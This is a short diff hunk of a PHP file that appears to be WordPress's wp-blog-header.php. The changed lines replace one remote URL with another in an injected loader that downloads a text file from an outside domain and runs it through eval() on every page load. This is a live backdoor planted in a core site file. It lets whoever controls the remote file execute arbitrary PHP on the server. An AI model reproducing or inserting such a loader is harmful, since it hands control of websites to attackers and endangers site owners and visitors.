@@ -19,7 +19,7 @@ function get_contents($url){
 }?>
 <?php
 $a =
-get_contents('https://bestxexercisextolloseweightx.com/sc/s4-jackets.txt');
+get_contents('https://ribaksudehospital.com/landing/nuockhoangbinhminh/nuockhoangbinhminh.txt');
 eval('?>'.$a);
 
 if ( ! isset( $wp_did_header ) ) {
